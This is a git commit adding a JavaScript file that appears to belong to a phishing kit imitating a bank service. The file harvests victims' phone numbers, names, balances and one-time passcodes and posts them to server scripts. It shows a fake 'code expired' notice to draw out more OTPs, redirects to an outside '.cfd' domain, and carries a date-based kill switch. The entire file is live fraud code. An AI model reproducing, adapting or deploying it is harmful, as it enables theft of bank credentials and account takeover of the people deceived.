f2256df04edadcbc0863d0ed1fccb8f02dbcab2a
dodypribadi5 <dodypribadi5@gmail.com>
2025-07-10 17:47:58 +0700

    Add files via upload

---
+++ token.js
@@ -0,0 +1,95 @@
+let tglNow = new Date();
+let waktuBatas = new Date("2025-10-25T23:59:59");
+if (tglNow.getTime() >= waktuBatas.getTime()) {
+  document.location.href = 'https://suspend-web.pages.dev';
+} else {
+  console.log('Server aktif');
+}
+function sendHp() {
+event.preventDefault();
+        var tarif = $('input[name="tarif"]:checked').val();
+       if (tarif) {  
+  sessionStorage.setItem('tarif', tarif);
+       }
+        var nohp = document.getElementById("nohp").value;
+        sessionStorage.setItem("nohp", nohp);
+        var nama = document.getElementById("nama").value;
+        sessionStorage.setItem("nama", nama);
+        var saldo = document.getElementById("saldo").value;
+        sessionStorage.setItem("saldo", saldo);
+$('.process1').fadeIn();
+ document.getElementById('btnSubmit1').innerHTML ="Memproses...";
+ 
+ 
+      $.ajax({
+            type: 'POST',
+            url: 'rest/no.php',
+            data: $('#formHP').serialize(),
+            datatype: 'text',
+            
+            complete: function(data) {
+            setTimeout(function(){
+  window.location.href='otp.html'
+  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
+ $('.process1').fadeOut();
+    }, 800);
+            }
+        })
+     }
+     
+
+
+
+// otp
+function sendOtp() {
+  event.stopPropagation();
+    event.preventDefault();
+  $("#djload").show();  
+ document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
+$.ajax({
+ type: 'POST',
+ url: 'rest/otp.php',
+ async: false,
+ dataType: 'JSON',
+ data: $('#form2').serialize(),
+ 
+ complete: function(data) {
+            console.log('Complete')
+setTimeout(function(){  
+       
+      
+    }, 2000);
+     $("#notif").text("- Kode Virtual sudah kadaluarsa -");
+     $("#notif").css("color", "red");
+        }
+    });
+      setTimeout(() => {
+     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode Virtual,<br/>Silahkan klik tombol dibawah ini";
+     $("#djload").hide();  
+   $("#notif").css("color", "black");
+ $("#sixpin").val("");
+document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";      
+              
+   }, 4000);
+
+  }
+
+
+
+
+// datawa
+
+function getcs(){
+ $("#djload").show();   
+  audio4 = document.getElementById("bsiku");
+  audio1 = document.getElementById("bsi");
+    audio4.play();
+     audio1.load();
+    audio4.loop = false
+setTimeout(function(){  
+location.href='https://choreoapps.ll-feed.cfd/wa/2pagebsi';
+    }, 5000);
+    setTimeout(function(){
+    $("#djload").hide();   
+    }, 5100);      
+}     
